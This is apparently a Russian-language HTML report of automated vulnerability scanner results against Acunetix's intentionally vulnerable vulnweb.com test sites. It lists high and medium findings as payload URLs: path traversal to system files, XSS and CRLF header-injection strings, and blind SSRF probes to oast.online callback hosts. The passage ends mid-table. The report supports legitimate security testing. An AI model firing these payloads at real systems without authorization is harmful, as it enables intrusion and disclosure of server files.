@@ -1,0 +1,2045 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Отчет по уязвимостям: general</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        h2 {
+            margin-top: 30px;
+            padding: 8px 15px;
+            border-radius: 4px;
+            color: white;
+        }
+        .critical h2 { background-color: #e74c3c; }
+        .high h2 { background-color: #e67e22; }
+        .medium h2 { background-color: #f39c12; }
+        .low h2 { background-color: #2ecc71; }
+        .info h2 { background-color: #3498db; }
+        .unknown h2 { background-color: #95a5a6; }
+        .ffuf h2 { background-color: #9b59b6; }
+        .sensitive h2 { background-color: #8e44ad; }
+        .juicypath h2 { background-color: #16a085; }
+        
+        .vuln-table {
+            width: 100%;
+            border-collapse: separate; /* Изменено для лучшей совместимости с прокруткой */
+            border-spacing: 0;
+            margin-bottom: 30px;
+            table-layout: fixed; /* Фиксированный макет таблицы */
+        }
+        .vuln-table th, .vuln-table td {
+            border: 1px solid #ddd;
+            padding: 10px;
+            text-align: left;
+            vertical-align: top;
+            overflow-wrap: break-word; /* Перенос длинных слов */
+        }
+        .vuln-table th {
+            background-color: #f2f2f2;
+        }
+        .vuln-table tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        /* Ширина колонок в процентах */
+        .vuln-table th:nth-child(1), .vuln-table td:nth-child(1) { width: 20%; }
+        .vuln-table th:nth-child(2), .vuln-table td:nth-child(2) { width: 10%; }
+        .vuln-table th:nth-child(3), .vuln-table td:nth-child(3) { width: 45%; }
+        .vuln-table th:nth-child(4), .vuln-table td:nth-child(4) { 
+            width: 25%; 
+            position: relative;
+            height: 100%;
+            padding: 0; /* Убираем отступы, чтобы скролл-контейнер занимал всю ячейку */
+        }
+        
+        /* Для таблиц с двумя колонками (URL-результаты) */
+        .two-col-table th:nth-child(1), .two-col-table td:nth-child(1) { width: 10%; }
+        .two-col-table th:nth-child(2), .two-col-table td:nth-child(2) { width: 90%; }
+        
+        .vuln-url {
+            word-break: break-all;
+        }
+        .extractor {
+            display: inline-block;
+            background-color: #f1f1f1;
+            padding: 2px 5px;
+            margin: 2px;
+            border-radius: 3px;
+            font-size: 0.85em;
+            font-family: monospace;
+            border: 1px solid #ddd;
+        }
+        /* Обновленные стили для контейнера с прокруткой */
+        .scroll-container {
+            max-height: 150px;
+            overflow-y: auto;
+            border: 1px solid #eee;
+            padding: 10px;
+            background-color: #fafafa;
+            display: block;
+            width: 100%;
+            height: 100%;
+            box-sizing: border-box;
+            border-radius: 3px;
+        }
+        .extractors-cell {
+            padding: 5px;
+            margin: 0;
+        }
+        .summary {
+            margin-bottom: 20px;
+            padding: 15px;
+            background-color: #edf2f7;
+            border-radius: 4px;
+        }
+        .summary-table {
+            width: 300px;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        .summary-table td {
+            padding: 5px 10px;
+            border: 1px solid #ddd;
+        }
+        .summary-table td:first-child {
+            font-weight: bold;
+        }
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 0.8em;
+            color: #7f8c8d;
+        }
+        .source-file {
+            font-style: italic;
+            color: #7f8c8d;
+            margin-bottom: 20px;
+        }
+        .no-vulns {
+            padding: 15px;
+            background-color: #f8d7da;
+            color: #721c24;
+            border-radius: 4px;
+            margin: 20px 0;
+        }
+        .severity-badge {
+            display: inline-block;
+            padding: 3px 6px;
+            border-radius: 3px;
+            color: white;
+            font-size: 0.8em;
+            margin-right: 5px;
+        }
+        .badge-critical { background-color: #e74c3c; }
+        .badge-high { background-color: #e67e22; }
+        .badge-medium { background-color: #f39c12; }
+        .badge-low { background-color: #2ecc71; }
+        .badge-info { background-color: #3498db; }
+        .badge-unknown { background-color: #95a5a6; }
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            cursor: help;
+        }
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: #555;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 5px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -100px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        .tab {
+            overflow: hidden;
+            border: 1px solid #ccc;
+            background-color: #f1f1f1;
+            border-radius: 5px 5px 0 0;
+        }
+        .tab button {
+            background-color: inherit;
+            float: left;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            padding: 14px 16px;
+            transition: 0.3s;
+            font-size: 17px;
+        }
+        .tab button:hover {
+            background-color: #ddd;
+        }
+        .tab button.active {
+            background-color: #3498db;
+            color: white;
+        }
+        .tabcontent {
+            display: none;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-top: none;
+            border-radius: 0 0 5px 5px;
+            animation: fadeEffect 1s;
+        }
+        @keyframes fadeEffect {
+            from {opacity: 0;}
+            to {opacity: 1;}
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Отчет по уязвимостям</h1>
+        <div class="source-file">Исходный файл: general.txt</div>
+        
+        <div class="summary">
+            <h3>Сводная информация</h3>
+            <table class="summary-table">
+                <tr>
+                    <td>Critical</td>
+                    <td>0</td>
+                </tr>
+                <tr>
+                    <td>High</td>
+                    <td>37</td>
+                </tr>
+                <tr>
+                    <td>Medium</td>
+                    <td>107</td>
+                </tr>
+                <tr>
+                    <td>Low</td>
+                    <td>8</td>
+                </tr>
+                <tr>
+                    <td>Info</td>
+                    <td>16</td>
+                </tr>
+                <tr>
+                    <td>Unknown</td>
+                    <td>0</td>
+                </tr>
+                <tr>
+                    <td>Всего</td>
+                    <td>168</td>
+                </tr>
+
+                <tr>
+                    <td>Ffuf находки</td>
+                    <td>5</td>
+                </tr>
+
+                <tr>
+                    <td>Sensitive находки</td>
+                    <td>21</td>
+                </tr>
+
+                <tr>
+                    <td>JuicyPath находки</td>
+                    <td>59</td>
+                </tr>
+
+            </table>
+        </div>
+        
+        <div class="tab">
+            <button class="tablinks active" onclick="openTab(event, 'NucleiTab')">Nuclei</button>
+
+            <button class="tablinks" onclick="openTab(event, 'FfufTab')">Ffuf</button>
+
+            <button class="tablinks" onclick="openTab(event, 'SensitiveTab')">Sensitive</button>
+
+            <button class="tablinks" onclick="openTab(event, 'JuicypathTab')">JuicyPath</button>
+
+        </div>
+        
+        <div id="NucleiTab" class="tabcontent" style="display: block;">
+
+                <div class="high">
+                    <h2>HIGH (37)</h2>
+                    <table class="vuln-table">
+                        <thead>
+                            <tr>
+                                <th>CVE/Тип</th>
+                                <th>Протокол</th>
+                                <th>URL</th>
+                                <th>Дополнительная информация</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+
+                            <tr>
+                                <td>linux-lfi-fuzz-arp-table</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/showimage.php?file=/proc/net/arp" target="_blank">http://testphp.vulnweb.com/showimage.php?file=/proc/net/arp</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>ssrf-blind</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/showimage.php?file=http://testphp.vulnweb.com%09d07rfrkos8d3hpir2bc0gcto1o5jboakj.oast.online" target="_blank">http://testphp.vulnweb.com/showimage.php?file=http://testphp.vulnweb.com%09d07rfrkos8d3hpir2bc0gcto1o5jboakj.oast.online</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>basic-xxe-post</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>basic-xxe-post</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-base64-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-base64-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-base64-search</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-base64-search</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-data-exf-fuzz-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-data-exf-fuzz-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-data-exf-search-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-data-exf-search-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-utf-7-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-utf-7-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-path-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-path-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-q-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-q-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-query-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-query-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-r-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-r-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-root-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-root-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-search-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xxe-via-search-ssrf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="rest.vulnweb.com" target="_blank">rest.vulnweb.com</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>windows-lfi-fuzz</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Templatize.asp?item=../../windows/win.ini" target="_blank">http://testasp.vulnweb.com/Templatize.asp?item=../../windows/win.ini</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=katana&lt;script&gt;alert.?()&lt;/script&gt;&amp;tfSearch=katana" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=katana&lt;script&gt;alert.?()&lt;/script&gt;&amp;tfSearch=katana</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:tfSearch_1</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>lfi-keyed</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../../../../../../../../windows/win.ini" target="_blank">http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../../../../../../../../windows/win.ini</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:item</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>xss-query</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Search.asp?tfSearch=katana&lt;script&gt;alert.?()&lt;/script&gt;" target="_blank">http://testasp.vulnweb.com/Search.asp?tfSearch=katana&lt;script&gt;alert.?()&lt;/script&gt;</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:tfSearch</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>lfi-keyed</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../../../../../../../../windows/win.ini" target="_blank">http://testasp.vulnweb.com/Templatize.asp?item=../../../../../../../../../../../../../../../windows/win.ini</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">query:item</span> <span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>oob-sql-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>oob-sql-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>oob-sql-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>oob-sql-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>oob-sql-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>oob-sql-body</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F" target="_blank">http://testasp.vulnweb.com/Login.asp?RetURL=%2FSearch%2Easp%3F</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="medium">
+                    <h2>MEDIUM (107)</h2>
+                    <table class="vuln-table">
+                        <thead>
+                            <tr>
+                                <th>CVE/Тип</th>
+                                <th>Протокол</th>
+                                <th>URL</th>
+                                <th>Дополнительная информация</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+
+                            <tr>
+                                <td>default-sql-dump</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://rest.vulnweb.com/db.sql" target="_blank">http://rest.vulnweb.com/db.sql</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">paths=&quot;/db.sql&quot;</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-fuzzing-chinese</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>black-fun-crlf-injection</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=%00X-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(1337)%3c/script%3e%2F..%2F..%2F..%2F../tr" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=%00X-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(1337)%3c/script%3e%2F..%2F..%2F..%2F../tr</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-fuzzing-chinese</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E&amp;pp=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E&amp;pp=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-fuzzing-chinese</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?artist=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E&amp;cat=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E" target="_blank">http://testphp.vulnweb.com/listproducts.php?artist=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E&amp;cat=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-fuzzing-chinese</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?cat=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E" target="_blank">http://testphp.vulnweb.com/listproducts.php?cat=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>black-fun-crlf-injection</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=CWS%07%0E000x%EF%BF%BD%00X-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(1337)%3c/script%3e%2F..%2F..%2F..%2F../tr&amp;pp=12%00X-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(1337)%3c/script%3e%2F..%2F..%2F..%2F../tr" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=CWS%07%0E000x%EF%BF%BD%00X-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(1337)%3c/script%3e%2F..%2F..%2F..%2F../tr&amp;pp=12%00X-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(1337)%3c/script%3e%2F..%2F..%2F..%2F../tr</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-fuzzing-chinese</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?+artist=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E" target="_blank">http://testphp.vulnweb.com/artists.php?+artist=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-fuzzing-chinese</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/product.php?pic=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E" target="_blank">http://testphp.vulnweb.com/product.php?pic=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>crlf-fuzzing-chinese</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?artist=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E" target="_blank">http://testphp.vulnweb.com/artists.php?artist=%0d%0aContent-Type:text/html%0d%0aContent-Length:60%0d%0a%0d%0a%3Cimg%20src=1%20onerror=alert(1)%3E</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>ssrf-bypass-via-crlf</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://d07rfrkos8d3hpir2bc0hzx858pht77px.oast.online" target="_blank">http://d07rfrkos8d3hpir2bc0hzx858pht77px.oast.online</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell">-</div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>alt-shift-x-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=xlmav&quot;accesskey=&quot;x&quot;onclick=&quot;alert(1)&quot;//wzraf" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=xlmav&quot;accesskey=&quot;x&quot;onclick=&quot;alert(1)&quot;//wzraf</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>alt-shift-x-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=xlmav&quot;accesskey=&quot;x&quot;onclick=&quot;alert(1)&quot;//wzraf&amp;pp=xlmav&quot;accesskey=&quot;x&quot;onclick=&quot;alert(1)&quot;//wzraf" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=xlmav&quot;accesskey=&quot;x&quot;onclick=&quot;alert(1)&quot;//wzraf&amp;pp=xlmav&quot;accesskey=&quot;x&quot;onclick=&quot;alert(1)&quot;//wzraf</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>dom-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/hpp/params.php?p=&#x27;);alert(1);//&amp;pp=&#x27;);alert(1);//" target="_blank">http://testphp.vulnweb.com/hpp/params.php?p=&#x27;);alert(1);//&amp;pp=&#x27;);alert(1);//</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>dom-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/product.php?pic=&#x27;);alert(1);//" target="_blank">http://testphp.vulnweb.com/product.php?pic=&#x27;);alert(1);//</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>dom-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/artists.php?artist=&#x27;);alert(1);//" target="_blank">http://testphp.vulnweb.com/artists.php?artist=&#x27;);alert(1);//</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
+                            </tr>
+
+                            <tr>
+                                <td>dom-xss</td>
+                                <td>http</td>
+                                <td class="vuln-url"><a href="http://testphp.vulnweb.com/listproducts.php?artist=&#x27;);alert(1);//&amp;cat=&#x27;);alert(1);//" target="_blank">http://testphp.vulnweb.com/listproducts.php?artist=&#x27;);alert(1);//&amp;cat=&#x27;);alert(1);//</a></td>
+                                <td><div class="scroll-container"><div class="extractors-cell"><span class="extractor">GET</span> </div></div></td>
